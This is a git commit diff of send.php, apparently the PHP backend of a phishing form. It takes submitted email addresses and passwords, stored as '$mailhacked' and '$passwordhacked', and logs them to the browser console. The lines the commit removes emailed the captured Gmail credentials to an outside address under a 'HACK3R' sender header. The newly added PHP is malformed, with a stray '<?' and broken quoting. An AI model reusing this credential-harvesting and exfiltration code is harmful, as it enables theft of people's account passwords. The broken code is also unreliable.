44e99cc37032a6fc25a2ba31b47914c49ea84caa
lowj2587 <102533264+lowj2587@users.noreply.github.com>
2024-10-14 11:55:06 -0400

    Update send.php

--- send.php
+++ send.php
@@ -1,31 +1,11 @@
-?php
+<?php
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
         
         echo "<script>console.log('Email: " . htmlspecialchars($mailhacked) . "');</script>";
         echo "<script>console.log('Password: " . htmlspecialchars($passwordhacked) . "');</script>";
-    }
-
-        //$mailhacked = $_POST["email"];
-        $passwordhacked = $_POST["password"];
-         $to = "lowj2587@laurens55.org";
-         $subject = "Workshop Gmail password";
-         
-         $message = "$mailhacked";
-         $message .= "<br>$passwordhacked";
-         
-         $header = "From:HACK3R@Hack3r.com \r\n";
-         $header .= "Cc:abcd@somedomain.com \r\n";
-         $header .= "MIME-Version: 1.0\r\n";
-         $header .= "Content-type: text/html\r\n";
-         
-         $retval = mail($to,$subject,$message,$header);
-         
-         if( $retval == true ) {
-            include("MKR.php");
-         }else {
-            echo "Message could not be sent...404 error check your internet";
-         }//
-      ?>
-
+<?
+<?php
+   echo '<script>console.log(\"$passwordhacked"\)</script>';
+?>
